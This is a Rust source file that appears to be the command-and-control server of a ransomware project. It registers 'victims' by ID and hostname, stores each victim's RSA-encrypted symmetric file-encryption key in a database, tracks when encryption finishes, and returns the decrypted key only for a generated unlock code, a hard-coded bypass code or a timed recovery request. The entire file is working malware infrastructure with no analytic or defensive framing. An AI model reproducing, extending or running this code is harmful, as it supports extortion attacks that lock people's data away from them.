use axum::{
    Router,
    extract::{self, State},
    routing::post,
};
use axum_embed::ServeEmbed;
use axum_server::tls_rustls::RustlsConfig;
use hex::{decode, encode};
use log::{debug, error, info, warn};
use rand::{RngExt, SeedableRng, rngs::StdRng};
use rust_embed::RustEmbed;
use std::{net::SocketAddr, time::SystemTime};

mod config;
mod models;

use models::Victim;

const RSA_LIMBS: usize = 32; // RSA key size in 64 bit limbs (2048 bits / 64 = 32)

use coconut_crab_lib::{
    file::get_exe_path_dir,
    web::{
        server_tls::{get_tls_private_key, get_tls_public_key},
        structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
        validate::{
            check_proof, validate_code, validate_hostname, validate_id, validate_key,
            validate_proof,
        },
    },
};

#[derive(Clone)]
struct AppState {
    db: toasty::Db,
}

#[derive(RustEmbed, Clone)]
#[folder = "assets/public"]
struct AssetPublic;

#[derive(RustEmbed)]
#[folder = "assets/private"]
struct AssetPrivate;

#[tokio::main(flavor = "multi_thread")]
async fn main() {
    env_logger::Builder::new()
        .filter_level(log::LevelFilter::Debug)
        .init();

    let db_path = {
        let exe_directory_path = get_exe_path_dir();
        format!("turso:{}/victims.db", exe_directory_path.to_string_lossy())
    };
    debug!("Database path: {db_path}");

    let db = toasty::Db::builder()
        .models(toasty::models!(Victim))
        .connect(&db_path)
        .await
        .expect("Failed to connect to Turso database");

    db.push_schema()
        .await
        .expect("Failed to push database schema");
    debug!("Database schema pushed");

    let shared_state = AppState { db };
    debug!("Web Application State Configured");

    let serve_public_assets = ServeEmbed::<AssetPublic>::new();

    let app = Router::new()
        .route("/register", post(register))
        .route("/upload-sym-key", post(upload_sym_key))
        .route("/announce-completion", post(announce_completion))
        .route("/download-sym-key", post(download_sym_key))
        .nest_service("/download", serve_public_assets)
        .with_state(shared_state);
    debug!("Routing Configured");

    let addr = SocketAddr::from(([0, 0, 0, 0], config::PORT));
    debug!("Socket Address Configured");

    if config::HTTPS {
        rustls::crypto::aws_lc_rs::default_provider()
            .install_default()
            .expect("Failed to install rustls crypto provider");
        let config = RustlsConfig::from_pem(get_tls_public_key(), get_tls_private_key())
            .await
            .expect("Failed to configure web server TLS");
        debug!("TLS Configured");

        axum_server::bind_rustls(addr, config)
            .serve(app.into_make_service())
            .await
            .expect("Failed to start web server");
    } else {
        axum_server::bind(addr)
            .serve(app.into_make_service())
            .await
            .expect("Failed to start web server");
    }
    debug!("Web Server Started");
}

fn generate_code() -> String {
    let mut rng = StdRng::from_rng(&mut rand::rng());
    let code: String = (0..4)
        .map(|_| {
            (0..4)
                .map(|_| {
                    let random_char = rng.random_range(0..62);
                    if random_char < 10 {
                        (b'0' + random_char) as char
                    } else if random_char < 36 {
                        (b'A' + (random_char - 10)) as char
                    } else {
                        (b'a' + (random_char - 36)) as char
                    }
                })
                .collect::<String>()
        })
        .collect::<Vec<String>>()
        .join("-");
    debug!("Generated new code: {code}");
    code
}

fn get_epoch_time() -> i64 {
    match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
        Ok(time) => {
            debug!("Reported Time: {time:?}");
            time.as_secs() as i64
        }
        Err(error) => {
            error!("Reported time before UNIX Epoch: {error}");
            0
        }
    }
}

fn decrypt_key(key: &str) -> String {
    let pem = String::from_utf8(
        AssetPrivate::get("asym-priv-key.pem")
            .expect("Failed to get private RSA key file")
            .data
            .to_vec(),
    )
    .expect("Failed to read PEM file");
    let private_key = purecrypto::rsa::RsaPrivateKey::<RSA_LIMBS>::from_pkcs1_pem(&pem)
        .expect("Failed to parse PEM key");
    let key_vec = match decode(key) {
        Ok(bytes) => {
            debug!("Decoded Key: {bytes:?}");
            bytes
        }
        Err(error) => {
            error!("Failed To Decode Key: {error}");
            return String::from("Invalid Key");
        }
    };
    let key = match private_key.decrypt_pkcs1v15(&key_vec) {
        Ok(key) => {
            debug!("Decrypted Key: {key:?}");
            key
        }
        Err(error) => {
            error!("Failed To Decrypt Key: {error}");
            return String::from("Invalid Key");
        }
    };
    encode(key)
}

async fn register(
    State(state): State<AppState>,
    extract::Json(registration): extract::Json<Registration>,
) -> String {
    info!("Received request to register");

    if validate_id(&registration.id) {
        debug!("[{}] Valid ID: {}", registration.id, registration.id);
    } else {
        warn!("[] Invalid ID: {}", registration.id);
        return String::from("Invalid ID");
    }

    if validate_hostname(&registration.hostname) {
        debug!(
            "[{}] Valid Hostname: {}",
            registration.id, registration.hostname
        );
    } else {
        warn!(
            "[{}] Invalid Hostname: {}",
            registration.id, registration.hostname
        );
        return String::from("Invalid Hostname");
    }

    if validate_proof(&registration.proof) {
        debug!("[{}] Valid Proof: {}", registration.id, registration.proof);
    } else {
        warn!(
            "[{}] Invalid Proof: {}",
            registration.id, registration.proof
        );
        return String::from("Invalid Proof");
    }

    let mut proof_source = [registration.id.as_bytes(), registration.hostname.as_bytes()].concat();
    if check_proof(
        &mut proof_source,
        config::PRESHARED_SECRET,
        &registration.proof,
    ) {
        debug!(
            "[{}] Proof Verification Success: {}",
            registration.id, registration.proof
        );
    } else {
        warn!(
            "[{}] Proof Verification Failure: {}",
            registration.id, registration.proof
        );
        return String::from("Invalid Proof");
    }

    let mut db = state.db.clone();

    let victim_exists = Victim::get_by_id(&mut db, &registration.id).await.is_ok();

    if victim_exists {
        warn!("[{}] Existing Victim Found", registration.id);
        warn!("[{}] Cannot Register New Victim", registration.id);
        String::from("Victim already exists")
    } else {
        info!("[{}] Adding New Victim", registration.id);
        toasty::create!(Victim {
            id: registration.id.clone(),
            hostname: registration.hostname.clone(),
            key: String::new(),
            code: String::new(),
            upload_time: 0,
            complete: false,
        })
        .exec(&mut db)
        .await
        .expect("Failed to insert victim");
        debug!("Inserted new victim into database");
        String::from("Success")
    }
}

async fn upload_sym_key(
    State(state): State<AppState>,
    extract::Json(uploadsymkey): extract::Json<UploadSymKey>,
) -> String {
    info!("Received request to upload symmetric key");

    if validate_id(&uploadsymkey.id) {
        debug!("[{}] Valid ID: {}", uploadsymkey.id, uploadsymkey.id);
    } else {
        warn!("[] Invalid ID: {}", uploadsymkey.id);
        return String::from("Invalid ID");
    }

    if validate_key(&uploadsymkey.key) {
        debug!("[{}] Valid Key: {}", uploadsymkey.id, uploadsymkey.key);
    } else {
        warn!("[{}] Invalid Key: {}", uploadsymkey.id, uploadsymkey.key);
        return String::from("Invalid Key");
    }

    if validate_proof(&uploadsymkey.proof) {
        debug!("[{}] Valid Proof: {}", uploadsymkey.id, uploadsymkey.proof);
    } else {
        warn!(
            "[{}] Invalid Proof: {}",
            uploadsymkey.id, uploadsymkey.proof
        );
        return String::from("Invalid Proof");
    }

    let mut proof_source = [uploadsymkey.id.as_bytes(), uploadsymkey.key.as_bytes()].concat();
    if check_proof(
        &mut proof_source,
        config::PRESHARED_SECRET,
        &uploadsymkey.proof,
    ) {
        debug!(
            "[{}] Proof Verification Success: {}",
            uploadsymkey.id, uploadsymkey.proof
        );
    } else {
        warn!(
            "[{}] Proof Verification Failure: {}",
            uploadsymkey.id, uploadsymkey.proof
        );
        return String::from("Invalid Proof");
    }

    let mut db = state.db.clone();

    let mut victim = match Victim::get_by_id(&mut db, &uploadsymkey.id).await {
        Ok(victim) => victim,
        Err(_) => {
            warn!("[{}] Existing Victim Not Found", uploadsymkey.id);
            warn!("[{}] Cannot Upload Symmetric Key", uploadsymkey.id);
            return String::from("Victim does not exist");
        }
    };

    let code = generate_code();
    let upload_time = get_epoch_time();

    victim
        .update()
        .key(uploadsymkey.key.clone())
        .code(code.clone())
        .upload_time(upload_time)
        .exec(&mut db)
        .await
        .expect("Failed to update victim");

    info!("[{}] Added Symmetric Key: {}", uploadsymkey.id, victim.key);
    info!("[{}] Added Code: {}", uploadsymkey.id, victim.code);
    info!(
        "[{}] Added Upload Time: {}",
        uploadsymkey.id, victim.upload_time
    );

    String::from("Success")
}

async fn announce_completion(
    State(state): State<AppState>,
    extract::Json(announcecompletion): extract::Json<AnnounceCompletion>,
) -> String {
    info!("Received request to announce completion");

    if validate_id(&announcecompletion.id) {
        debug!(
            "[{}] Valid ID: {}",
            announcecompletion.id, announcecompletion.id
        );
    } else {
        warn!("[] Invalid ID: {}", announcecompletion.id);
        return String::from("Invalid ID");
    }

    if validate_proof(&announcecompletion.proof) {
        debug!(
            "[{}] Valid Proof: {}",
            announcecompletion.id, announcecompletion.proof
        );
    } else {
        warn!(
            "[{}] Invalid Proof: {}",
            announcecompletion.id, announcecompletion.proof
        );
        return String::from("Invalid Proof");
    }

    let mut proof_source = announcecompletion.id.as_bytes().to_vec();
    if check_proof(
        &mut proof_source,
        config::PRESHARED_SECRET,
        &announcecompletion.proof,
    ) {
        debug!(
            "[{}] Proof Verification Success: {}",
            announcecompletion.id, announcecompletion.proof
        );
    } else {
        warn!(
            "[{}] Proof Verification Failure: {}",
            announcecompletion.id, announcecompletion.proof
        );
        return String::from("Invalid Proof");
    }

    let mut db = state.db.clone();

    let mut victim = match Victim::get_by_id(&mut db, &announcecompletion.id).await {
        Ok(victim) => victim,
        Err(_) => {
            warn!("[{}] Existing Victim Not Found", announcecompletion.id);
            warn!("[{}] Cannot Announce Completion", announcecompletion.id);
            return String::from("Victim does not exist");
        }
    };

    info!("[{}] Designating As Complete", announcecompletion.id);
    victim
        .update()
        .complete(true)
        .exec(&mut db)
        .await
        .expect("Failed to update victim");

    String::from("Success")
}

#[allow(clippy::too_many_lines)]
async fn download_sym_key(
    State(state): State<AppState>,
    extract::Json(downloadsymkey): extract::Json<DownloadSymKey>,
) -> String {
    info!("Received request to download symmetric key");

    if validate_id(&downloadsymkey.id) {
        debug!("[{}] Valid ID: {}", downloadsymkey.id, downloadsymkey.id);
    } else {
        warn!("[] Invalid ID: {}", downloadsymkey.id);
        return String::from("Invalid ID");
    }

    if validate_code(&downloadsymkey.code) {
        debug!(
            "[{}] Valid Code: {}",
            downloadsymkey.id, downloadsymkey.code
        );
    } else {
        warn!(
            "[{}] Invalid Code: {}",
            downloadsymkey.id, downloadsymkey.code
        );
        return String::from("Invalid Code");
    }

    if validate_proof(&downloadsymkey.proof) {
        debug!(
            "[{}] Valid Proof: {}",
            downloadsymkey.id, downloadsymkey.proof
        );
    } else {
        warn!(
            "[{}] Invalid Proof: {}",
            downloadsymkey.id, downloadsymkey.proof
        );
        return String::from("Invalid Proof");
    }

    let mut proof_source = [downloadsymkey.id.as_bytes(), downloadsymkey.code.as_bytes()].concat();
    if check_proof(
        &mut proof_source,
        config::PRESHARED_SECRET,
        &downloadsymkey.proof,
    ) {
        debug!(
            "[{}] Proof Verification Success: {}",
            downloadsymkey.id, downloadsymkey.proof
        );
    } else {
        warn!(
            "[{}] Proof Verification Failure: {}",
            downloadsymkey.id, downloadsymkey.proof
        );
        return String::from("Invalid Proof");
    }

    let mut db = state.db.clone();

    let existing_victim = match Victim::get_by_id(&mut db, &downloadsymkey.id).await {
        Ok(victim) => {
            debug!(
                "[{}] Existing Victim Found: {:?}",
                downloadsymkey.id, victim
            );
            victim
        }
        Err(_) => {
            warn!("[{}] Existing Victim Not Found", downloadsymkey.id);
            warn!("[{}] Cannot Download Symmetric Key", downloadsymkey.id);
            return String::from("Victim does not exist");
        }
    };

    let mut recovery_valid = false;
    if !existing_victim.complete && downloadsymkey.code == "0000-0000-0000" {
        info!("[{}] Key Recovery Requested", downloadsymkey.id);
        if existing_victim.upload_time == 0 {
            error!("[{}] No Upload Time Recorded", downloadsymkey.id);
        } else {
            let current_time = get_epoch_time();
            debug!(
                "[{}] Current Epoch Time: {} seconds",
                downloadsymkey.id, current_time
            );
            let recovery_window = config::RECOVERY_WINDOW * 60;
            debug!(
                "[{}] Key Recovery Window: {} seconds",
                downloadsymkey.id, recovery_window
            );
            let elapsed_time = current_time - existing_victim.upload_time;
            debug!(
                "[{}] Elapsed Time: {} seconds",
                downloadsymkey.id, elapsed_time
            );
            if elapsed_time <= recovery_window as i64 {
                recovery_valid = true;
            }
        }
        if recovery_valid {
            info!("[{}] Key Recovery Valid", downloadsymkey.id);
        } else {
            warn!("[{}] Key Recovery Not Valid", downloadsymkey.id);
        }
    }

    if existing_victim.code == downloadsymkey.code
        || downloadsymkey.code == config::BYPASS_CODE
        || recovery_valid
    {
        info!(
            "[{}] Correct Code: {}",
            downloadsymkey.id, downloadsymkey.code
        );
        info!("[{}] Providing Decrypted Key", downloadsymkey.id);
        return decrypt_key(&existing_victim.key);
    }
    warn!(
        "[{}] Incorrect Code: {}",
        downloadsymkey.id, downloadsymkey.code
    );
    "Invalid Code".to_string()
}
